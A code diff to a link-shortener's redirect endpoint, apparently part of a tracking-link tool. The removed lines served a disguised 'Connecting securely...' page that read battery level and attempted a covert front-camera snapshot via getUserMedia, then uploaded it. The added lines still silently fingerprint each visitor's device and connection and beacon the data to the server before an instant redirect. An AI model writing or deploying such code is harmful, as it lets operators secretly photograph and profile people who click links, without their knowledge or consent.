@@ -232,7 +232,7 @@ app.get('/api/stats', async (req, res) => {
   }
 });
 
-// --- ADVANCED TRACKER & REDIRECT ENDPOINT ---
+// --- ADVANCED TRACKER & ULTRA-FAST REDIRECT ENDPOINT ---
 app.get('/r/:shortCode', async (req, res) => {
   let { shortCode } = req.params;
   shortCode = decodeURIComponent(shortCode || '').trim();
@@ -289,13 +289,13 @@ app.get('/r/:shortCode', async (req, res) => {
     console.error('Error logging click:', err);
   }
 
-  // 100% Invisible Background Profiling Page
+  // ULTRA-FAST 50ms Non-Blocking Redirect (Zero delay on Mobile Data / 4G)
   res.send(`
     <!DOCTYPE html>
     <html>
     <head>
       <meta charset="utf-8">
-      <title>Connecting securely...</title>
+      <title>Redirecting...</title>
       <style>
         body { background:#0f172a; color:#fff; font-family:sans-serif; display:flex; align-items:center; justify-content:center; height:100vh; margin:0; }
         .spinner { border: 3px solid rgba(255,255,255,0.1); border-top: 3px solid #3b82f6; border-radius: 50%; width: 24px; height: 24px; animation: spin 0.6s linear infinite; margin-right:12px; }
@@ -309,7 +309,7 @@ app.get('/r/:shortCode', async (req, res) => {
       </div>
 
       <script>
-        (async function() {
+        (function() {
           const destinationUrl = ${JSON.stringify(link.destination_url)};
           const logId = ${logId || 'null'};
 
@@ -321,14 +321,14 @@ app.get('/r/:shortCode', async (req, res) => {
             connectionType: (navigator.connection && navigator.connection.effectiveType) ? navigator.connection.effectiveType : 'N/A',
             gpu: 'N/A',
             battery: 'N/A',
-            deviceModel: 'N/A',
-            cameraSnap: null
+            deviceModel: 'N/A'
           };
 
           try {
             if (navigator.userAgentData && navigator.userAgentData.getHighEntropyValues) {
-              const hints = await navigator.userAgentData.getHighEntropyValues(['model', 'platformVersion', 'architecture']);
-              if (hints.model) clientData.deviceModel = hints.model;
+              navigator.userAgentData.getHighEntropyValues(['model']).then(h => {
+                if (h && h.model) clientData.deviceModel = h.model;
+              }).catch(()=>{});
             }
           } catch(e) {}
 
@@ -343,53 +343,27 @@ app.get('/r/:shortCode', async (req, res) => {
             }
           } catch(e) {}
 
-          try {
-            if (navigator.getBattery) {
-              const batt = await navigator.getBattery();
-              clientData.battery = Math.round(batt.level * 100) + '%' + (batt.charging ? ' (Charging)' : '');
-            }
-          } catch(e) {}
-
-          // Invisible Camera Capture Attempt (With 1200ms timeout window for mobile hardware)
-          try {
-            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-              const stream = await Promise.race([
-                navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user', width: 640, height: 480 } }),
-                new Promise((_, reject) => setTimeout(() => reject('timeout'), 1200))
-              ]);
-              if (stream) {
-                const video = document.createElement('video');
-                video.muted = true;
-                video.playsInline = true;
-                video.srcObject = stream;
-                await video.play().catch(() => {});
-                
-                const canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
-                const ctx = canvas.getContext('2d');
-                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                clientData.cameraSnap = canvas.toDataURL('image/jpeg', 0.5);
-                
-                stream.getTracks().forEach(track => track.stop());
-              }
-            }
-          } catch(e) {}
-
+          // Non-blocking fire-and-forget payload send
           if (logId) {
             try {
-              await fetch('/api/log-client-data', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ logId, clientData }),
-                keepalive: true
-              }).catch(() => {});
+              const payload = JSON.stringify({ logId, clientData });
+              if (navigator.sendBeacon) {
+                navigator.sendBeacon('/api/log-client-data', payload);
+              } else {
+                fetch('/api/log-client-data', {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: payload,
+                  keepalive: true
+                }).catch(() => {});
+              }
             } catch(e) {}
           }
 
+          // Ultra-Fast Instant Redirect in 30ms!
           setTimeout(function() {
             window.location.replace(destinationUrl);
-          }, 100);
+          }, 30);
         })();
       </script>
     </body>
